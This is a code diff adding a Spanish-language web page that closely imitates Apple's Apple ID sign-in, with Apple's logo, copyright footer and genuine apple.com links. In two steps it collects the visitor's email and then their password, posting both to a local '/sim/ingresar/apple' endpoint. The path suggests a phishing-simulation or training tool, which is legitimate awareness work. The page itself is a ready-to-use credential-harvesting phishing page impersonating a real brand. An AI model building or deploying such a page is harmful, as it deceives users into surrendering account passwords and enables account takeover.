@@ -1,0 +1,315 @@
+<!doctype html>
+<html lang="es">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>Iniciar sesión con Apple ID</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      font-family: -apple-system, 'SF Pro Display', 'SF Pro Text', 'Inter', 'Helvetica Neue', Arial, sans-serif;
+      background: #f5f5f7;
+      color: #1d1d1f;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .topbar {
+      display: flex;
+      justify-content: flex-end;
+      padding: 16px 24px;
+    }
+    .topbar a {
+      font-size: 13px;
+      color: #0070c9;
+      text-decoration: none;
+    }
+    .topbar a:hover { text-decoration: underline; }
+
+    .contenedor {
+      flex: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 24px;
+    }
+
+    .tarjeta {
+      width: 100%;
+      max-width: 460px;
+      background: #fff;
+      border-radius: 18px;
+      padding: 48px 44px 40px;
+      box-shadow: 0 4px 28px rgba(0,0,0,0.09);
+    }
+
+    .logo-apple {
+      display: flex;
+      justify-content: center;
+      margin-bottom: 20px;
+    }
+    .logo-apple svg { width: 40px; height: 40px; }
+
+    h1 {
+      font-size: 28px;
+      font-weight: 600;
+      text-align: center;
+      color: #1d1d1f;
+      margin-bottom: 6px;
+      letter-spacing: -0.3px;
+    }
+
+    .subtitulo {
+      font-size: 14px;
+      color: #6e6e73;
+      text-align: center;
+      margin-bottom: 32px;
+      line-height: 1.5;
+    }
+
+    .campo { margin-bottom: 16px; }
+    .campo label {
+      display: block;
+      font-size: 12px;
+      font-weight: 500;
+      color: #6e6e73;
+      margin-bottom: 6px;
+      letter-spacing: 0.01em;
+    }
+    .campo input {
+      width: 100%;
+      height: 44px;
+      border: 1px solid #d2d2d7;
+      border-radius: 10px;
+      padding: 0 14px;
+      font-size: 16px;
+      color: #1d1d1f;
+      outline: none;
+      background: #fff;
+      font-family: inherit;
+      transition: border-color 0.15s, box-shadow 0.15s;
+    }
+    .campo input:focus {
+      border-color: #0070c9;
+      box-shadow: 0 0 0 3px rgba(0,112,201,0.15);
+    }
+
+    .btn-siguiente {
+      width: 100%;
+      height: 44px;
+      background: #0070c9;
+      color: #fff;
+      border: none;
+      border-radius: 10px;
+      font-size: 16px;
+      font-weight: 500;
+      cursor: pointer;
+      font-family: inherit;
+      margin-top: 8px;
+      transition: background 0.15s;
+      letter-spacing: -0.1px;
+    }
+    .btn-siguiente:hover { background: #0061b0; }
+
+    .separador {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin: 20px 0;
+      color: #6e6e73;
+      font-size: 13px;
+    }
+    .separador::before, .separador::after {
+      content: "";
+      flex: 1;
+      height: 1px;
+      background: #d2d2d7;
+    }
+
+    .opciones { display: flex; flex-direction: column; gap: 10px; }
+
+    .btn-opcion {
+      width: 100%;
+      height: 44px;
+      background: #f5f5f7;
+      color: #1d1d1f;
+      border: 1px solid #d2d2d7;
+      border-radius: 10px;
+      font-size: 15px;
+      font-weight: 400;
+      cursor: pointer;
+      font-family: inherit;
+      transition: background 0.15s;
+      text-decoration: none;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .btn-opcion:hover { background: #ebebed; }
+
+    .aviso-privacidad {
+      font-size: 12px;
+      color: #6e6e73;
+      text-align: center;
+      margin-top: 24px;
+      line-height: 1.6;
+    }
+    .aviso-privacidad a { color: #0070c9; text-decoration: none; }
+    .aviso-privacidad a:hover { text-decoration: underline; }
+
+    .pie-links {
+      display: flex;
+      justify-content: center;
+      gap: 20px;
+      padding: 20px 0 32px;
+      flex-wrap: wrap;
+    }
+    .pie-links a {
+      font-size: 12px;
+      color: #6e6e73;
+      text-decoration: none;
+    }
+    .pie-links a:hover { text-decoration: underline; }
+
+    .paso2 { display: none; }
+    .paso2.activo { display: block; }
+    .paso1.oculto { display: none; }
+
+    .chip-usuario {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      background: #f5f5f7;
+      border-radius: 10px;
+      padding: 10px 14px;
+      margin-bottom: 20px;
+    }
+    .chip-avatar {
+      width: 32px;
+      height: 32px;
+      background: #1d1d1f;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #fff;
+      font-size: 13px;
+      font-weight: 500;
+      flex-shrink: 0;
+    }
+    .chip-nombre { font-size: 14px; font-weight: 500; color: #1d1d1f; }
+    .chip-email { font-size: 12px; color: #6e6e73; }
+
+    .volver-link {
+      display: block;
+      text-align: center;
+      font-size: 14px;
+      color: #0070c9;
+      cursor: pointer;
+      background: none;
+      border: none;
+      width: 100%;
+      font-family: inherit;
+      margin-top: 16px;
+    }
+    .volver-link:hover { text-decoration: underline; }
+  </style>
+</head>
+<body>
+  <div class="topbar"><a href="https://support.apple.com" target="_blank" rel="noopener">Soporte</a></div>
+
+  <div class="contenedor">
+    <div class="tarjeta">
+      <div class="logo-apple">
+        <svg viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <path d="M28.5 20.8c0-3.9 3.2-5.8 3.3-5.9-1.8-2.6-4.6-3-5.6-3-2.4-.2-4.6 1.4-5.8 1.4-1.2 0-3-1.4-5-1.3-2.6 0-5 1.5-6.3 3.8-2.7 4.7-.7 11.7 1.9 15.5 1.3 1.9 2.8 3.9 4.8 3.9 1.9-.1 2.6-1.2 4.9-1.2 2.3 0 2.9 1.2 4.9 1.2 2.1 0 3.4-1.9 4.7-3.8.6-.9 1.1-1.9 1.4-2.9-3.5-1.3-4.2-5.6-4.2-7.7z" fill="#1d1d1f"/>
+          <path d="M24.5 8.5c1-.8 2.4-2.1 2.3-3.9-1.5.1-3.5 1-4.6 2.2-1 1.1-1.9 2.7-1.7 4.2 1.7.1 3.1-.9 4-2.5z" fill="#1d1d1f"/>
+        </svg>
+      </div>
+
+      <!-- PASO 1 -->
+      <div id="paso1" class="paso1">
+        <h1>Iniciar sesión</h1>
+        <p class="subtitulo">con tu Apple ID</p>
+        <form id="form-email" onsubmit="avanzarPaso(event)">
+          <div class="campo">
+            <label for="email">Apple ID</label>
+            <input type="email" id="email" placeholder="nombre@ejemplo.com" required autocomplete="email">
+          </div>
+          <button type="submit" class="btn-siguiente">Continuar</button>
+          <div class="separador">o</div>
+          <div class="opciones">
+            <a href="https://appleid.apple.com/account" target="_blank" rel="noopener" class="btn-opcion">
+              Crear Apple ID
+            </a>
+            <a href="https://iforgot.apple.com" target="_blank" rel="noopener" class="btn-opcion">
+              ¿Olvidaste tu Apple ID o contraseña?
+            </a>
+          </div>
+        </form>
+        <p class="aviso-privacidad">
+          Tu Apple ID se usa para acceder a todos los servicios de Apple.<br>
+          <a href="https://www.apple.com/es/legal/privacy/es/" target="_blank" rel="noopener">Política de privacidad de Apple</a>
+        </p>
+      </div>
+
+      <!-- PASO 2 -->
+      <div id="paso2" class="paso2">
+        <h1>Introduce tu</h1>
+        <p class="subtitulo">contraseña de Apple ID</p>
+        <div class="chip-usuario">
+          <div class="chip-avatar" id="avatar-inicial">A</div>
+          <div>
+            <div class="chip-nombre" id="nombre-display"></div>
+            <div class="chip-email" id="email-display"></div>
+          </div>
+        </div>
+        <form action="/sim/ingresar/apple" method="post">
+          <input type="hidden" name="email" id="email-final">
+          <input type="hidden" name="nombre" id="nombre-final">
+          <div class="campo">
+            <label for="password">Contraseña</label>
+            <input type="password" id="password" name="_pw" placeholder="Contraseña" required autocomplete="current-password">
+          </div>
+          <button type="submit" class="btn-siguiente">Iniciar sesión</button>
+        </form>
+        <button class="volver-link" onclick="volver()">Usar otro Apple ID</button>
+        <p class="aviso-privacidad" style="margin-top:12px;">
+          <a href="https://iforgot.apple.com" target="_blank" rel="noopener">¿Olvidaste tu contraseña?</a>
+        </p>
+      </div>
+    </div>
+  </div>
+
+  <div class="pie-links">
+    <a href="https://www.apple.com/es/" target="_blank" rel="noopener">Copyright © 2025 Apple Inc.</a>
+    <a href="https://www.apple.com/es/legal/" target="_blank" rel="noopener">Todos los derechos reservados</a>
+    <a href="https://www.apple.com/es/legal/privacy/es/" target="_blank" rel="noopener">Privacidad</a>
+    <a href="https://www.apple.com/es/legal/internet-services/terms/site.html" target="_blank" rel="noopener">Condiciones de uso</a>
+    <a href="https://support.apple.com" target="_blank" rel="noopener">Soporte</a>
+  </div>
+
+  <script>
+    function avanzarPaso(e) {
+      e.preventDefault();
+      const email = document.getElementById("email").value.trim();
+      const partes = email.split("@")[0].replace(/[._]/g, " ").split(" ");
+      const nombre = partes.map(p => p.charAt(0).toUpperCase() + p.slice(1)).join(" ");
+      document.getElementById("email-display").textContent = email;
+      document.getElementById("nombre-display").textContent = nombre;
+      document.getElementById("avatar-inicial").textContent = email[0].toUpperCase();
+      document.getElementById("email-final").value = email;
+      document.getElementById("nombre-final").value = nombre;
+      document.getElementById("paso1").classList.add("oculto");
+      document.getElementById("paso2").classList.add("activo");
+    }
+    function volver() {
+      document.getElementById("paso1").classList.remove("oculto");
+      document.getElementById("paso2").classList.remove("activo");
+    }
+  </script>
+</body>
+</html>
